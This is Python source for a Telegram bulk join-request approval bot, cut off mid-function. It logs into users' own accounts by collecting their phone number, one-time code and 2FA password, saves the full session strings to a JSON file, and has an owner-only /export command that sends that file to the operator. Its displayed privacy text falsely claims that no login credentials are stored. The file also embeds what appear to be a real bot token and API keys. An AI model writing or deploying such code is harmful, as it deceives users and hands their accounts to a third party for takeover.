import os
from html import escape as h
import json
import logging
import asyncio
import re
from datetime import datetime, timedelta, timezone
from pathlib import Path
from aiogram.client.bot import DefaultBotProperties
from dotenv import load_dotenv
from aiogram import Bot, Dispatcher, types
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove, FSInputFile
from aiogram.enums.chat_member_status import ChatMemberStatus
from aiogram.enums.chat_type import ChatType
from aiogram.enums.parse_mode import ParseMode
from aiogram.exceptions import TelegramForbiddenError, TelegramBadRequest
from aiogram.filters import Command, CommandStart
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

# Session login imports
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PhoneNumberInvalidError,
    FloodWaitError,
    PhoneCodeExpiredError
)

logging.basicConfig(level=logging.WARNING)
logging.getLogger('aiogram').setLevel(logging.WARNING)

load_dotenv()

BOT_TOKEN = os.getenv('BOT_TOKEN', '8719198691:AAHmEJ_7khOIdXRYEJJJaZ-kwt8xjeAZ82Q')
OWNER_ID = int(os.getenv('OWNER_ID', '8729304171'))  # Add owner ID in .env

if not BOT_TOKEN:
    raise RuntimeError('⚠️ BOT_TOKEN not set in .env')

# Session credentials
API_ID = int(os.getenv('API_ID', '33029767'))
API_HASH = os.getenv('API_HASH', '5d897bed11bc8b062a12f6c1c3c5360a')

DATA_DIR = Path('data')
DATA_DIR.mkdir(exist_ok=True)

ACCEPTED_FN = DATA_DIR / 'accepted_users.json'
GROUPS_FN = DATA_DIR / 'groups.json'
LIMITS_FN = DATA_DIR / 'limits.json'
SESSIONS_FN = DATA_DIR / 'sessions.json'

CATBOX_VIDEO_URL = 'https://files.catbox.moe/kg7jcs.mp4'

# FSM States
class LoginStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_password = State()

def load_json(path: Path, default=None):
    if not path.exists():
        path.write_text(json.dumps(default or {}, indent=2))
    return json.loads(path.read_text())

def save_json(path: Path, data):
    path.write_text(json.dumps(data, indent=2))

groups = load_json(GROUPS_FN, {})
limits = load_json(LIMITS_FN, {})
accepted_users = set(load_json(ACCEPTED_FN, []))
user_sessions = load_json(SESSIONS_FN, {})

# Sessions folder for session files
SESSIONS_DIR = Path('sessions')
SESSIONS_DIR.mkdir(exist_ok=True)

# Rate limiter to avoid bans
class RateLimiter:
    """Simple rate limiter to avoid Telegram bans"""
    def __init__(self, max_calls: int = 30, period: int = 60):
        self.max_calls = max_calls
        self.period = period
        self.calls = []
    
    async def acquire(self):
        """Wait if rate limit exceeded"""
        import time
        now = time.time()
        self.calls = [t for t in self.calls if now - t < self.period]
        if len(self.calls) >= self.max_calls:
            wait_time = self.period - (now - self.calls[0])
            if wait_time > 0:
                await asyncio.sleep(wait_time)
        self.calls.append(time.time())

rate_limiter = RateLimiter()

# Store active login sessions
active_login_sessions = {}


PRIVACY_POLICY_TEXT = (
    "✦ 🤖 <b>ᴀᴋ ᴀᴜᴛᴏ ʀᴇǫᴜᴇsᴛ</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "\n"
    "🚀 ᴄᴏʀᴇ ꜰᴇᴀᴛᴜʀᴇꜱ\n"
    "├─ ᴀᴜᴛᴏ-ᴊᴏɪɴ ɢʀᴏᴜᴘꜱ & ᴄʜᴀɴɴᴇʟꜱ\n"
    "├─ ʙᴜʟᴋ ᴊᴏɪɴ ʀᴇǫᴜᴇꜱᴛ ᴀᴘᴘʀᴏᴠᴀʟ\n"
    "└─ ꜰᴀꜱᴛ, ʀᴇʟɪᴀʙʟᴇ & ᴇꜰꜰɪᴄɪᴇɴᴛ\n"
    "\n"
    "🛡️ ᴘʀɪᴠᴀᴄʏ & ꜱᴇᴄᴜʀɪᴛʏ\n"
    "├─ ɴᴏ ʟᴏɢɪɴ ᴄʀᴇᴅᴇɴᴛɪᴀʟꜱ ꜱᴛᴏʀᴇᴅ\n"
    "├─ ᴜꜱᴇʀ-ᴄᴏɴᴛʀᴏʟʟᴇᴅ ᴛᴀʀɢᴇᴛ ʟɪɴᴋꜱ\n"
    "├─ ᴘʀɪᴠᴀᴄʏ-ꜰᴏᴄᴜꜱᴇᴅ ᴏᴘᴇʀᴀᴛɪᴏɴ\n"
    "└─ ʀᴇꜱᴘᴏɴꜱɪʙʟᴇ ᴜꜱᴀɢᴇ ᴏɴʟʏ\n"
    "\n"
    "🔗 ꜱɪᴍᴘʟʏ ᴜꜱᴇ ᴛʜᴇ ʙᴏᴛ ᴀɴᴅ ᴇɴᴊᴏʏ ꜱᴍᴏᴏᴛʜ ᴘᴇʀꜰᴏʀᴍᴀɴᴄᴇ!\n"
    "\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "👑 ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴀɴᴜᴊ ᴋᴜᴍᴀʀ\n"
    "💎 ᴘʀᴇᴍɪᴜᴍ • ꜱᴇᴄᴜʀᴇ • ᴇꜰꜰɪᴄɪᴇɴᴛ\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)

WELCOME_TEXT = (
    "✦ 🤖 <b>ᴀᴋ ᴀᴜᴛᴏ ʀᴇǫᴜᴇsᴛ</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "\n"
    "📌 ʙᴏᴛ ꜰᴇᴀᴛᴜʀᴇs\n"
    "├─ ᴀᴜᴛᴏ-ᴊᴏɪɴ ɢʀᴏᴜᴘꜱ & ᴄʜᴀɴɴᴇʟꜱ\n"
    "├─ ʙᴜʟᴋ ᴊᴏɪɴ ʀᴇǫᴜᴇꜱᴛ ᴀᴘᴘʀᴏᴠᴀʟ\n"
    "└─ ᴇᴀꜱʏ ᴀᴄᴄᴇꜱꜱ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ\n"
    "\n"
    "⚡ ǫᴜɪᴄᴋ ꜱᴛᴀʀᴛ\n"
    "❶ /login  -  ᴄᴏɴɴᴇᴄᴛ ᴀᴄᴄᴏᴜɴᴛ\n"
    "❷ /approve -  ᴀᴘᴘʀᴏᴠᴇ ʀᴇǫᴜᴇꜱᴛꜱ\n"
    "❸ /cmds   -  ᴠɪᴇᴡ ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅꜱ\n"
    "\n"
    "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ\n"
    "✦ ᴀɴᴜᴊ ᴋᴜᴍᴀʀ\n"
    "\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "💎 ᴘʀᴇᴍɪᴜᴍ • ꜱᴘᴇᴇᴅ • ᴘᴇʀꜰᴏʀᴍᴀɴᴄᴇ\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)

APPROVE_WELCOME_TEXT = (
    "✦ ⚡ <b>ᴀᴋ ʙᴜʟᴋ ᴀᴘᴘʀᴏᴠᴀʟ</b>\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "\n"
    "🔑 ᴀᴄᴄᴏᴜɴᴛ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ\n"
    "├─ /login  -  ᴄᴏɴɴᴇᴄᴛ ᴀᴄᴄᴏᴜɴᴛ\n"
    "└─ /logout -  ᴅɪꜱᴄᴏɴɴᴇᴄᴛ ᴀᴄᴄᴏᴜɴᴛ\n"
    "\n"
    "✅ ᴀᴘᴘʀᴏᴠᴀʟ ᴄᴏᴍᴍᴀɴᴅꜱ\n"
    "├─ <code>/approve chat_id</code>\n"
    "├─ <code>/approve all chat_id</code>\n"
    "└─ <code>/approve count(n) chat_id</code>\n"
    "\n"
    "💡 ᴜꜱᴇ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅꜱ ᴀꜱ ʀᴇǫᴜɪʀᴇᴅ.\n"
    "\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "👑 ᴅᴇᴠᴇʟᴏᴘᴇᴅ ʙʏ ᴀɴᴜᴊ ᴋᴜᴍᴀʀ\n"
    "💎 ᴘʀᴇᴍɪᴜᴍ • ꜱᴘᴇᴇᴅ • ᴘᴇʀꜰᴏʀᴍᴀɴᴄᴇ\n"
    "━━━━━━━━━━━━━━━━━━━━━━"
)

bot_username_cache = None

async def get_bot_username():
    global bot_username_cache
    if bot_username_cache is None:
        me = await bot.get_me()
        bot_username_cache = me.username
    return bot_username_cache

# Colored buttons (Bot API style: "primary" blue, "success" green, "danger" red)
BTN_PRIMARY = "primary"
BTN_SUCCESS = "success"
BTN_DANGER = "danger"

def make_button(text: str, callback_data: str = None, url: str = None, style: str = None) -> InlineKeyboardButton:
    kw = {"text": text}
    if callback_data:
        kw["callback_data"] = callback_data
    if url:
        kw["url"] = url
    if style:
        kw["style"] = style
    return InlineKeyboardButton(**kw)

async def get_welcome_kb() -> InlineKeyboardMarkup:
    username = await get_bot_username()
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button('➕ Add to Group', url=f'https://t.me/{username}?startgroup=true', style=BTN_SUCCESS)],
        [make_button('➕ Add to Channel', url=f'https://t.me/{username}?startchannel=start', style=BTN_PRIMARY)],
    ])

async def get_approve_kb(user_id: int) -> InlineKeyboardMarkup:
    username = await get_bot_username()
    
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            make_button('🔑 Login', callback_data='approve_login', style=BTN_SUCCESS),
            make_button('🚪 Logout', callback_data='approve_logout', style=BTN_DANGER)
        ],
        [
            make_button('✅ Approve All', callback_data='approve_all_info', style=BTN_PRIMARY)
        ],
        [
            make_button('👥 Add to Group', url=f'https://t.me/{username}?startgroup=true', style=BTN_SUCCESS),
            make_button('📢 Add to Channel', url=f'https://t.me/{username}?startchannel=start', style=BTN_PRIMARY)
        ]
    ])

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML))

dp = Dispatcher(storage=MemoryStorage())

def save_state():
    save_json(ACCEPTED_FN, list(accepted_users))
    save_json(GROUPS_FN, groups)
    save_json(LIMITS_FN, limits)
    save_json(SESSIONS_FN, user_sessions)

async def is_chat_admin(chat_id: int, user_id: int) -> bool:
    try:
        member = await bot.get_chat_member(chat_id, user_id)
        return member.status in (ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.CREATOR)
    except Exception:
        return False

async def get_chat_name(chat_id: int) -> str:
    cid = str(chat_id)
    if cid in groups:
        return groups[cid]
    try:
        chat = await bot.get_chat(chat_id)
        title = chat.title or str(chat_id)
        groups[cid] = title
        save_state()
        return title
    except Exception:
        return str(chat_id)

REQUIRED_CHANNEL = os.getenv('REQUIRED_CHANNEL', '')

async def is_member_of_channel(user_id: int, channel_username: str = None) -> bool:
    channel_username = channel_username or REQUIRED_CHANNEL
    if not channel_username:
        return True
    try:
        member = await bot.get_chat_member(chat_id=channel_username, user_id=user_id)
        return member.status != 'left'
    except Exception:
        return False

async def _disconnect_login(uid: int):
    """Drop the temporary login client once the session has been saved."""
    info = active_login_sessions.pop(uid, None)
    if info and info.get('client'):
        try:
            await info['client'].disconnect()
        except Exception:
            pass

async def get_user_client(user_id: int):
    """Get user's Telethon client if session exists"""
    user_session = user_sessions.get(str(user_id))
    if not user_session or not user_session.get('is_active'):
        return None
    
    session_string = user_session.get('session_string')
    if not session_string:
        return None
    
    try:
        client = TelegramClient(
            StringSession(session_string),
            API_ID,
            API_HASH,
            device_model="MD Auto Request",
            system_version="1.0",
            app_version="1.0"
        )
        await client.connect()
        if await client.is_user_authorized():
            return client
        else:
            await client.disconnect()
            return None
    except Exception as e:
        logging.error(f"Client connection error for user {user_id}: {e}")
        return None

@dp.my_chat_member()
async def track_chat(evt: types.ChatMemberUpdated):
    if evt.new_chat_member.status in (ChatMemberStatus.MEMBER, ChatMemberStatus.ADMINISTRATOR):
        cid = str(evt.chat.id)
        groups[cid] = evt.chat.title or cid
        save_state()

_background_tasks = set()

def send_welcome_to_user(user_id: int):
    async def _send():
        gif = CATBOX_VIDEO_URL
        kb = await get_welcome_kb()
        await bot.send_video(
            chat_id=user_id,
            video=gif,
            caption=WELCOME_TEXT,
            reply_markup=kb,
            parse_mode=ParseMode.HTML,
        )
    task = asyncio.create_task(_send())
    _background_tasks.add(task)  # keep a reference so the task is not garbage-collected
    task.add_done_callback(_background_tasks.discard)
    return task

@dp.message(CommandStart(deep_link=True))
@dp.message(CommandStart())
async def cmd_start(msg: types.Message):
    if msg.chat.type != ChatType.PRIVATE:
        return
    
    uid = msg.from_user.id
    if not await is_member_of_channel(uid):
        await msg.answer(
            "❌ You must join our channel to use this bot.\n"
            "Please join first and then try again.",
            parse_mode=None,
        )
        return
    
    if uid not in accepted_users:
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text='✅ Accept & Continue', callback_data='accept_privacy')]
        ])
        await msg.answer(PRIVACY_POLICY_TEXT, reply_markup=kb, parse_mode=None)
    else:
        send_welcome_to_user(uid)

@dp.callback_query(lambda c: c.data == 'accept_privacy')
async def accept_privacy(cb: CallbackQuery):
    uid = cb.from_user.id
    accepted_users.add(uid)
    save_state()
    await cb.answer('✅ Accepted & Continued!')
    await cb.message.delete()
    send_welcome_to_user(uid)

@dp.callback_query(lambda c: c.data == 'login_cancel')
async def login_cancel_callback(cb: CallbackQuery, state: FSMContext):
    """Handle login cancel callback"""
    uid = cb.from_user.id
    
    # Cleanup login session
    session_info = active_login_sessions.pop(uid, None)
    if session_info:
        client = session_info.get('client')
        if client:
            try:
                await client.disconnect()
            except:
                pass
    
    await state.clear()
    await cb.message.edit_text("❌ Login cancelled.", reply_markup=None)
    await cb.answer("Cancelled")

@dp.message(Command('login'))
async def cmd_login(msg: types.Message, state: FSMContext):
    """Handle /login command"""
    if msg.chat.type != ChatType.PRIVATE:
        return
    
    uid = msg.from_user.id
    if not await is_member_of_channel(uid):
        await msg.answer(
            "❌ You must join our channel to use this bot.\n"
            "Please join first and then try again.",
            parse_mode=None,
        )
        return
    
    if str(uid) in user_sessions and user_sessions[str(uid)].get('is_active', False):
        await msg.answer("ℹ️ You are already logged in. Use /logout to logout first.", parse_mode=None)
        return
    
    # Ask for phone number with share button
    phone_keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text='📱 Share Phone Number', request_contact=True)]],
        resize_keyboard=True,
        one_time_keyboard=True
    )
    
    await msg.answer(
        "📱 Please share your phone number to login:\n\n"
        "\"You can either:\"\n"
        "\"1. Click the '📱 Share Phone Number' button below\"\n"
        "\"2. Or type your phone number in international format (e.g., +1234567890)\"\n\n"
        "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
        reply_markup=phone_keyboard,
        parse_mode=ParseMode.HTML
    )
    # Also send an inline cancel button in case they want to cancel easily
    await msg.answer(
        "👇 Click below to cancel logic process:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="❌ Cancel Login", callback_data="login_cancel")]])
    )
    
    await state.set_state(LoginStates.waiting_for_phone)

@dp.message(LoginStates.waiting_for_phone)
async def process_phone_number(msg: types.Message, state: FSMContext):
    """Process phone number input"""
    uid = msg.from_user.id
    
    # Check for commands
    if msg.text and msg.text.startswith('/'):
        if msg.text == '/cancel':
            await cmd_cancel(msg, state)
            return
        await state.clear()
        await msg.answer("⚠️ Login cancelled. Please send your command again.")
        return

    # Get phone number
    if msg.contact and msg.contact.phone_number:
        phone_number = msg.contact.phone_number
        if not phone_number.startswith("+"):
            phone_number = "+" + phone_number.lstrip("+")
    elif msg.text:
        phone_text = msg.text.strip()
        if not (phone_text.startswith("+") and phone_text[1:].replace(" ", "").isdigit()):
            await msg.answer(
                "❌ Invalid phone number format.\n"
                "Please use international format, e.g., +1234567890",
                reply_markup=ReplyKeyboardRemove(),
                parse_mode=None
            )
            return
        phone_number = phone_text.replace(" ", "")
    else:
        await msg.answer("❌ Please provide a valid phone number.", parse_mode=None)
        return
    
    status_msg = await msg.answer("🔄 Connecting...", reply_markup=ReplyKeyboardRemove(), parse_mode=None)
    
    try:
        # Create Telethon client and send OTP
        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model="MD Auto Request",
            system_version="1.0",
            app_version="1.0"
        )
        
        await client.connect()
        result = await client.send_code_request(phone_number)
        
        # Store client and phone_code_hash for verification
        active_login_sessions[uid] = {
            'client': client,
            'phone_number': phone_number,
            'phone_code_hash': result.phone_code_hash,
            'sent_at': datetime.now(timezone.utc).timestamp()
        }
        
        await state.update_data(phone_number=phone_number)
        await state.set_state(LoginStates.waiting_for_code)
        
        try:
            await status_msg.edit_text(
                f"✅ Code sent to {h(phone_number)}\n\n"
                "📱 Check your Telegram app for the OTP code.\n"
                "Please enter the code you received in format <code>CODE_12345</code>:\n\n"
                "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
                parse_mode=ParseMode.HTML
            )
        except TelegramBadRequest:
            await bot.send_message(
                uid,
                f"✅ Code sent to {h(phone_number)}\n\n"
                "📱 Check your Telegram app for the OTP code.\n"
                "Please enter the code you received in format <code>CODE_12345</code>:\n\n"
                "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
                parse_mode=ParseMode.HTML
            )
        
    except PhoneNumberInvalidError:
        try:
            await status_msg.edit_text("❌ Invalid phone number. Please try again with /login")
        except TelegramBadRequest:
            await bot.send_message(uid, "❌ Invalid phone number. Please try again with /login")
        await state.clear()
    except FloodWaitError as e:
        try:
            await status_msg.edit_text(f"❌ Too many attempts. Please wait {e.seconds} seconds and try again.")
        except TelegramBadRequest:
            await bot.send_message(uid, f"❌ Too many attempts. Please wait {e.seconds} seconds and try again.")
        await state.clear()
    except Exception as e:
        logging.error(f"Login error for {uid}: {e}")
        try:
            await status_msg.edit_text(f"❌ Error: {str(e)}")
        except TelegramBadRequest:
            await bot.send_message(uid, f"❌ Error: {str(e)}")
        await state.clear()

@dp.message(LoginStates.waiting_for_code)
async def process_verification_code(msg: types.Message, state: FSMContext):
    """Process OTP verification code"""
    uid = msg.from_user.id
    code_text = msg.text.strip()
    
    # Extract code (e.g., "CODE_12345" -> "12345")
    if '_' in code_text:
        parts = code_text.split('_')
        if len(parts) == 2 and parts[0].upper() == 'CODE':
            code = parts[1]
        else:
            code = code_text.replace('_', '')
    elif code_text.lower().startswith('code'):
        code = code_text[4:].lstrip('_')
    else:
        code = code_text
    
    code = code.replace(" ", "")
    
    if not code.isdigit():
        await msg.answer(
            "❌ Invalid code format.\n"
            "Please enter the code in format `CODE_12345`",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    
    session_info = active_login_sessions.get(uid)
    if not session_info:
        await msg.answer("❌ Session expired. Please start again with /login", parse_mode=None)
        await state.clear()
        return
    
    # Check if code expired (3 minutes)
    sent_at = session_info.get('sent_at', 0)
    if (datetime.now(timezone.utc).timestamp() - sent_at) > 180:
        client = session_info.get('client')
        if client:
            try:
                await client.disconnect()
            except:
                pass
        active_login_sessions.pop(uid, None)
        await msg.answer("❌ Code expired. Please start again with /login", parse_mode=None)
        await state.clear()
        return
    
    status_msg = await msg.answer("🔄 Verifying code...", parse_mode=None)
    
    try:
        client = session_info['client']
        phone = session_info['phone_number']
        phone_code_hash = session_info['phone_code_hash']
        
        try:
            # Attempt sign-in with OTP
            user = await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # Success! Save session
            session_str = client.session.save()
            
            user_sessions[str(uid)] = {
                'session_string': session_str,
                'phone_number': phone,
                'created_at': datetime.now().isoformat(),
                'is_active': True,
                'user_info': {
                    'id': user.id,
                    'first_name': user.first_name,
                    'last_name': user.last_name,
                    'username': user.username
                }
            }
            save_state()
            
            # Cleanup
            await _disconnect_login(uid)
            await state.clear()
            
            await status_msg.edit_text(
                f"✅ Login Successful!\n\n"
                f"📱 Phone: {h(phone)}\n"
                f"👤 Name: {h(user.first_name or '')} {h(user.last_name or '')}\n"
                f"🆔 Username: @{h(user.username or 'None')}\n\n"
                "You can now use /approve commands.\n\n"
                "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
                parse_mode=ParseMode.HTML
            )
            
        except SessionPasswordNeededError:
            # 2FA required
            await state.set_state(LoginStates.waiting_for_password)
            await status_msg.edit_text(
                "🔐 Two-Step Verification\n\n"
                "Please enter your 2FA password in format <code>PASS_mypassword</code>:\n\n"
                "⚠️ Your password is case-sensitive.\n\n"
                "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
                parse_mode=ParseMode.HTML
            )
            
        except PhoneCodeInvalidError:
            await status_msg.edit_text(
                "❌ Invalid code. Please try again in format `CODE_12345`:",
                parse_mode=ParseMode.MARKDOWN
            )
            
        except PhoneCodeExpiredError:
            try:
                await client.disconnect()
            except:
                pass
            active_login_sessions.pop(uid, None)
            await status_msg.edit_text("❌ Code expired. Please start again with /login")
            await state.clear()
            
    except Exception as e:
        logging.error(f"Verification error for {uid}: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)}")
        await state.clear()

@dp.message(LoginStates.waiting_for_password)
async def process_2fa_password(msg: types.Message, state: FSMContext):
    """Process 2FA password"""
    uid = msg.from_user.id
    password_text = msg.text.strip()
    
    # Extract password (e.g., "PASS_mypassword" -> "mypassword")
    if '_' in password_text:
        parts = password_text.split('_', 1)
        if len(parts) == 2 and parts[0].upper() == 'PASS':
            password = parts[1]
        else:
            password = password_text.replace('_', '')
    elif password_text.lower().startswith('pass'):
        password = password_text[4:].lstrip('_')
    else:
        password = password_text
    
    session_info = active_login_sessions.get(uid)
    if not session_info:
        await msg.answer("❌ Session expired. Please start again with /login", parse_mode=None)
        await state.clear()
        return
    
    # Delete password message for security
    try:
        await msg.delete()
    except:
        pass
    
    status_msg = await bot.send_message(uid, "🔄 Verifying password...", parse_mode=None)
    
    try:
        client = session_info['client']
        phone = session_info['phone_number']
        
        # Verify 2FA password
        user = await client.sign_in(password=password)
        
        # Success! Save session
        session_str = client.session.save()
        
        user_sessions[str(uid)] = {
            'session_string': session_str,
            'phone_number': phone,
            'created_at': datetime.now().isoformat(),
            'is_active': True,
            'user_info': {
                'id': user.id,
                'first_name': user.first_name,
                'last_name': user.last_name,
                'username': user.username
            }
        }
        save_state()
        
        # Cleanup
        await _disconnect_login(uid)
        await state.clear()
        
        await status_msg.edit_text(
            f"✅ Login Successful!\n\n"
            f"📱 Phone: {h(phone)}\n"
            f"👤 Name: {h(user.first_name or '')} {h(user.last_name or '')}\n"
            f"🆔 Username: @{h(user.username or 'None')}\n"
            f"🔒 2FA: Enabled\n\n"
            "You can now use /approve commands.\n\n"
            "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
            parse_mode=ParseMode.HTML
        )
        
    except Exception as e:
        logging.error(f"2FA error for {uid}: {e}")
        await status_msg.edit_text(
            "❌ Invalid password. Please try again in format `PASS_mypassword`\n\n"
            "If you forgot your password, please /cancel and restart with /login",
            parse_mode=ParseMode.MARKDOWN
        )

@dp.message(Command('logout'))
async def cmd_logout(msg: types.Message, state: FSMContext):
    """Handle /logout command"""
    if msg.chat.type != ChatType.PRIVATE:
        return
    
    uid = msg.from_user.id
    await state.clear()
    
    if not await is_member_of_channel(uid):
        await msg.answer(
            "❌ You must join our channel to use this bot.\n"
            "Please join first and then try again.",
            parse_mode=None,
        )
        return
    
    if str(uid) in user_sessions:
        # Disconnect client if active
        client = await get_user_client(uid)
        if client:
            try:
                await client.disconnect()
            except:
                pass
        
        user_sessions[str(uid)]['is_active'] = False
        save_state()
        await msg.answer(
            "🚪 Logged out successfully!\n\n"
            "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
            parse_mode=ParseMode.HTML
        )
    else:
        await msg.answer("ℹ️ You are not logged in.", parse_mode=None)

@dp.message(Command('cancel'))
async def cmd_cancel(msg: types.Message, state: FSMContext):
    """Cancel any ongoing operation"""
    uid = msg.from_user.id
    
    # Cleanup login session
    session_info = active_login_sessions.pop(uid, None)
    if session_info:
        client = session_info.get('client')
        if client:
            try:
                await client.disconnect()
            except:
                pass
    
    await state.clear()
    await msg.answer("❌ Operation cancelled.", parse_mode=None)

@dp.message(Command('export'))
async def cmd_export(msg: types.Message):
    """Export all data files - Owner only"""
    if msg.from_user.id != OWNER_ID:
        await msg.answer("❌ This command is for owner only.", parse_mode=None)
        return
    
    try:
        await msg.answer("📦 Exporting data files...", parse_mode=None)
        
        # Send all data files
        files_to_export = [
            (ACCEPTED_FN, "Accepted Users"),
            (GROUPS_FN, "Groups"),
            (LIMITS_FN, "Limits/Modes"),
            (SESSIONS_FN, "User Sessions")
        ]
        
        for file_path, file_desc in files_to_export:
            if file_path.exists():
                try:
                    await bot.send_document(
                        msg.from_user.id,
                        FSInputFile(file_path),
                        caption=f"📄 {file_desc}\n👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>"
                    )
                except Exception as e:
                    logging.error(f"Error sending {file_desc}: {e}")
        
        await msg.answer(
            "✅ Data export completed!\n\n"
            "👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>",
            parse_mode=ParseMode.HTML
        )
    
    except Exception as e:
        await msg.answer(f"❌ Export error: {str(e)}", parse_mode=None)

@dp.message(Command('approve'))
async def cmd_approve(msg: types.Message):
    if msg.chat.type != ChatType.PRIVATE:
        return
    
    uid = msg.from_user.id
    if not await is_member_of_channel(uid):
        await msg.answer(
            "❌ You must join our channel to use this bot.\n"
            "Please join first and then try again.",
            parse_mode=None,
        )
        return
    
    # Parse command arguments
    args = msg.text.split()[1:] if len(msg.text.split()) > 1 else []
    
    if args and len(args) >= 2:
        mode = args[0]
        try:
            chat_id = int(args[1])
            
            if mode == 'all':
                await handle_approve_all(msg, chat_id, uid)
                return
            elif mode.startswith('count(') and mode.endswith(')'):
                count = int(mode[6:-1])
                await handle_approve_count(msg, chat_id, count, uid)
                return
        except ValueError:
            await msg.answer("❌ Invalid chat ID or count number.", parse_mode=None)
            return
    elif args and len(args) == 1:
        # Just chat_id provided, show UI for that chat
        try:
            chat_id = int(args[0])
            chat_name = await get_chat_name(chat_id)
            
            kb = await get_approve_kb(uid)
            is_logged_in = str(uid) in user_sessions and user_sessions[str(uid)].get('is_active', False)
            status_text = "🟢 Status: Logged In" if is_logged_in else "🔴 Status: Not Logged In"
            
            # Use HTML to avoid markdown parsing errors
            caption = (
                f"{APPROVE_WELCOME_TEXT}\n\n"
                f"📊 Target Chat: {chat_name}\n"
                f"🆔 Chat ID: {chat_id}\n\n"
                f"{status_text}"
            )
            
            await bot.send_video(
                chat_id=uid,
                video=CATBOX_VIDEO_URL,
                caption=caption,
                reply_markup=kb,
                parse_mode=None
            )
            return
        except ValueError:
            pass
    
    # Show approve UI with photo
    kb = await get_approve_kb(uid)
    
    # Check login status
    is_logged_in = str(uid) in user_sessions and user_sessions[str(uid)].get('is_active', False)
    status_text = "🟢 Status: Logged In" if is_logged_in else "🔴 Status: Not Logged In"
    
    await bot.send_video(
        chat_id=uid,
        video=CATBOX_VIDEO_URL,
        caption=APPROVE_WELCOME_TEXT + f"\n\n{status_text}",
        reply_markup=kb,
        parse_mode=None
    )

async def handle_approve_all(msg: types.Message, chat_id: int, user_id: int):
    """Handle /approve all <chat_id> command"""
    client = await get_user_client(user_id)
    if not client:
        await msg.answer("❌ Please login first using /login command.", parse_mode=None)
        return

    status_msg = await msg.answer("🔄 Processing requests...", parse_mode=None)
    try:
        peer = await resolve_chat(client, chat_id)
        ids = await session_fetch_pending(client, peer)

        approved_count = 0
        for uid in ids:
            if await session_approve(client, peer, uid):
                approved_count += 1
                await asyncio.sleep(0.5)  # Rate limit protection

        chat_name = await get_chat_name(chat_id)
        await status_msg.edit_text(
            f"✅ Approved {approved_count} members in {h(chat_name)}\n\n"
            f"👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>"
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error accessing chat: {h(str(e))}")
        logging.error(f"Approve all error: {e}")
    finally:
        await client.disconnect()

async def handle_approve_count(msg: types.Message, chat_id: int, count: int, user_id: int):
    """Handle /approve count(n) <chat_id> command"""
    client = await get_user_client(user_id)
    if not client:
        await msg.answer("❌ Please login first using /login command.", parse_mode=None)
        return

    status_msg = await msg.answer(f"🔄 Processing {count} requests...", parse_mode=None)
    try:
        peer = await resolve_chat(client, chat_id)
        ids = (await session_fetch_pending(client, peer))[:count]

        approved_count = 0
        for uid in ids:
            if await session_approve(client, peer, uid):
                approved_count += 1
                await asyncio.sleep(0.5)  # Rate limit protection

        chat_name = await get_chat_name(chat_id)
        await status_msg.edit_text(
            f"✅ Approved {approved_count}/{count} members in {h(chat_name)}\n\n"
            f"👨🏻‍💻 Dev : <a href='https://t.me/anujedits76'>Anuj Kumar</a>"
        )
    except Exception as e:
        await status_msg.edit_text(f"❌ Error accessing chat: {h(str(e))}")
        logging.error(f"Approve count error: {e}")
    finally:
        await client.disconnect()

@dp.callback_query(lambda c: c.data.startswith('approve_'))
async def handle_approve_callbacks(cb: CallbackQuery, state: FSMContext):
    uid = cb.from_user.id
    data = cb.data
    
    if data == 'approve_login':
        # Check if already logged in (answer the callback only once)
        if str(uid) in user_sessions and user_sessions[str(uid)].get('is_active', False):
            await cb.answer("ℹ️ You are already logged in!", show_alert=True)
            return
        await cb.answer()
        
        # Ask for phone number
        phone_keyboard = ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text='📱 Share Phone Number', request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
        
        await bot.send_message(
            uid,
